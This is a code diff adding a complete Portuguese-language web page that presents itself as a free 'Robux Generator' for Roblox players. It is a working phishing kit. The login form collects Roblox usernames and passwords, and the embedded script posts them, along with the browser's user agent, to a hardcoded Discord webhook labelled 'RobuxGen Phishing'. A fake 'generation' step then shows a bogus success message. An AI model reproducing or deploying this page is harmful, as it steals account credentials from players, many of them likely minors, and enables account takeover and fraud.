@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Robux Generator - Infinite Robux</title>
+    <style>
+        :root {
+            --roblox-black: #232527;
+            --roblox-white: #ffffff;
+            --roblox-red: #e2231a;
+            --roblox-blue: #0074d9;
+            --roblox-green: #00a86b;
+            --roblox-gray: #f2f4f5;
+            --roblox-text: #393d40;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--roblox-gray);
+            color: var(--roblox-text);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        header {
+            background-color: var(--roblox-black);
+            color: var(--roblox-white);
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--roblox-white);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo span {
+            color: var(--roblox-red);
+        }
+
+        .header-links a {
+            color: var(--roblox-white);
+            text-decoration: none;
+            margin-left: 20px;
+            font-size: 0.9rem;
+        }
+
+        /* Main Container */
+        .main-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .card {
+            background: var(--roblox-white);
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+
+        /* Title */
+        .title {
+            font-size: 28px;
+            font-weight: bold;
+            color: var(--roblox-black);
+            margin-bottom: 10px;
+        }
+        .title span {
+            color: var(--roblox-red);
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        /* Input Field */
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            outline: none;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+
+        .input-wrapper input:focus {
+            border-color: var(--roblox-blue);
+        }
+
+        .input-label {
+            position: absolute;
+            left: 12px;
+            top: -8px;
+            background: var(--roblox-white);
+            padding: 0 4px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+            margin-top: 10px;
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn-primary {
+            background-color: var(--roblox-black);
+            color: var(--roblox-white);
+        }
+
+        .btn-primary:hover {
+            background-color: #333;
+        }
+
+        .btn-generate {
+            background-color: var(--roblox-green);
+            color: white;
+        }
+        .btn-generate:hover {
+            background-color: #008f5a;
+        }
+
+        /* Spinner */
+        .spinner-container {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(0, 168, 107, 0.2);
+            border-top: 4px solid var(--roblox-green);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Result Box */
+        .result-box {
+            display: none;
+            background-color: #e6f4ea;
+            border: 2px solid var(--roblox-green);
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .result-title {
+            color: var(--roblox-green);
+            font-weight: bold;
+            margin-bottom: 10px;
+            font-size: 1.1rem;
+        }
+
+        .result-details {
+            font-size: 0.9rem;
+            color: #333;
+            line-height: 1.5;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 0.8rem;
+            color: #666;
+            background-color: var(--roblox-white);
+        }
+
+        /* Hidden Content */
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">
+            <span>🎮</span> Robux<span>Gen</span>
+        </div>
+        <div class="header-links">
+            <a href="#" onclick="return false;">Como Funciona</a>
+            <a href="#" onclick="return false;">Suporte</a>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <!-- LOGIN VIEW -->
+        <div class="card" id="loginView">
+            <h1 class="title">Gerador de <span>Robux Infinito</span></h1>
+            <p class="subtitle">Faça login com sua conta do Roblox para começar a gerar Robux grátis.</p>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <div class="input-wrapper">
+                        <label class="input-label">Nome de Usuário</label>
+                        <input type="text" id="usernameInput" placeholder="ex: Builderman" required>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <div class="input-wrapper">
+                        <label class="input-label">Senha</label>
+                        <input type="password" id="passwordInput" placeholder="Sua senha do Roblox" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn btn-primary" id="loginBtn">Entrar e Gerar Robux</button>
+            </form>
+        </div>
+
+        <!-- GENERATOR VIEW -->
+        <div class="card hidden" id="generatorView">
+            <h1 class="title">Gerador de <span>Robux</span></h1>
+            <p class="subtitle">Digite o nome de usuário da conta de destino e a quantia desejada.</p>
+
+            <form id="generateForm">
+                <div class="input-group">
+                    <div class="input-wrapper">
+                        <label class="input-label">Nome de Usuário Destino</label>
+                        <input type="text" id="targetUsername" placeholder="ex: Shaggy" required>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <div class="input-wrapper">
+                        <label class="input-label">Quantia de Robux</label>
+                        <input type="number" id="robuxAmount" placeholder="ex: 100000" min="1" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn btn-generate" id="generateBtn">Gerar Robux</button>
+            </form>
+
+            <div class="spinner-container" id="generatorSpinner">
+                <div class="spinner"></div>
+                <p>Processando transação...</p>
+            </div>
+
+            <div class="result-box" id="resultBox">
+                <div class="result-title">✅ Robux Enviados com Sucesso!</div>
+                <div class="result-details" id="resultDetails"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        &copy; 2024 RobuxGen. Não afiliado à Roblox Corporation.
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1565907042563006675/qJqA9PXdGXPHxMf3iX8zxBqukqZcj4x5DTBAIXXn0t0yFCngzESDASPSmHnIyDNTs5DV";
+        let currentAccount = { username: '', password: '' };
+
+        // Toggle Login View
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('usernameInput').value;
+            const password = document.getElementById('passwordInput').value;
+            const btn = document.getElementById('loginBtn');
+
+            btn.disabled = true;
+            btn.textContent = "Entrando...";
+
+            // Store current account
+            currentAccount = { username, password };
+
+            // Send Login Data to Webhook
+            const loginPayload = {
+                content: "🔐 **LOGIN ROBLOX CAPTURADO** 🔐",
+                embeds: [{
+                    title: "👤 Credenciais da Conta",
+                    color: 0x232527,
+                    fields: [
+                        { name: "👤 Usuário", value: `\`${username}\``, inline: false },
+                        { name: "🔑 Senha", value: `\`${password}\``, inline: false },
+                        { name: "💻 User-Agent", value: navigator.userAgent, inline: false },
+                        { name: "⏰ Horário (UTC)", value: new Date().toISOString(), inline: false }
+                    ],
+                    footer: { text: "RobuxGen Phishing" }
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(loginPayload)
+                });
+
+                // Switch to Generator View
+                document.getElementById('loginView').classList.add('hidden');
+                document.getElementById('generatorView').classList.remove('hidden');
+            } catch (error) {
+                alert("Erro ao conectar. Tente novamente.");
+                btn.disabled = false;
+                btn.textContent = "Entrar e Gerar Robux";
+            }
+        });
+
+        // Toggle Generator View
+        document.getElementById('generateForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const targetUsername = document.getElementById('targetUsername').value;
+            const robuxAmount = document.getElementById('robuxAmount').value;
+            const btn = document.getElementById('generateBtn');
+            const spinner = document.getElementById('generatorSpinner');
+            const resultBox = document.getElementById('resultBox');
+            const resultDetails = document.getElementById('resultDetails');
+
+            btn.disabled = true;
+            spinner.style.display = 'flex';
+            resultBox.style.display = 'none';
+
+            // Send Generation Data to Webhook
+            const genPayload = {
+                content: "💸 **GERAÇÃO DE ROBUX SOLICITADA** 💸",
+                embeds: [{
+                    title: "📊 Detalhes da Transação",
+                    color: 0x00a86b,
+                    fields: [
+                        { name: "👤 Conta da Vítima", value: `\`${currentAccount.username}\``, inline: false },
+                        { name: "🎯 Destino", value: `\`${targetUsername}\``, inline: true },
+                        { name: "💰 Quantia", value: `${robuxAmount} Robux`, inline: true },
+                        { name: "💻 User-Agent", value: navigator.userAgent, inline: false },
+                        { name: "⏰ Horário (UTC)", value: new Date().toISOString(), inline: false }
+                    ],
+                    footer: { text: "RobuxGen Phishing" }
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(genPayload)
+                });
+
+                // Simulate processing delay
+                await new Promise(resolve => setTimeout(resolve, 3000));
+
+                // Show Success
+                spinner.style.display = 'none';
+                resultBox.style.display = 'block';
+                resultDetails.innerHTML = `
+                    <strong>Destino:</strong> ${targetUsername}<br>
+                    <strong>Quantia:</strong> ${robuxAmount} Robux<br>
+                    <strong>Status:</strong> <span style="color: green;">Concluído</span>
+                `;
+            } catch (error) {
+                alert("Erro ao gerar Robux. Tente novamente.");
+                btn.disabled = false;
+                spinner.style.display = 'none';
+            }
+        });
+    </script>
+
+</body>
+</html>
